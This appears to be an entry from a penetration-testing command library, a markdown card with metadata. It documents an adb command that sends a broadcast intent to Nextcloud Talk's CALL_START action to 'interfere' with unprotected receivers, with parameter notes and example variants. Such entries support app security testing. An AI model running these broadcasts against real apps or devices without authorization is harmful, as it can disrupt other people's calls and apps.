---
data: >-
  adb shell am broadcast -a com.nextcloud.talk.CALL_START --es interference_flag
  "disrupt"
tags:
  - android
  - exploitation
  - broadcast
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:42.587Z'
id: 344e03c4-c175-41a9-9cb0-67c8a64f6946
verified: false
validated: true
submitted: true
---
# adb-send-broadcast

## Command

```bash
adb shell am broadcast -a com.nextcloud.talk.CALL_START --es interference_flag "disrupt"
```

## Description

Sends an Android broadcast intent via ADB to test or exploit unprotected receivers, such as in Nextcloud Talk for interference.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-a` | Action name of the broadcast | Yes |
| `--es` | Extra string key-value pair | No |
| `-n` | Component name (package/class) | No |

## Examples

### Basic Usage

```bash
adb shell am broadcast -a com.example.ACTION
```

### Advanced Usage

```bash
adb shell am broadcast -a com.nextcloud.talk.CALL_START --es key "value" -n com.nextcloud.talk/.Receiver
```

## Expected Output

Broadcast sent successfully with no errors; the target app processes the intent if unprotected.

## Related

- [[commands/adb-logcat-filter]]
- [[procedures/Send-Malicious-Broadcast-to-Unprotected-Receiver]]
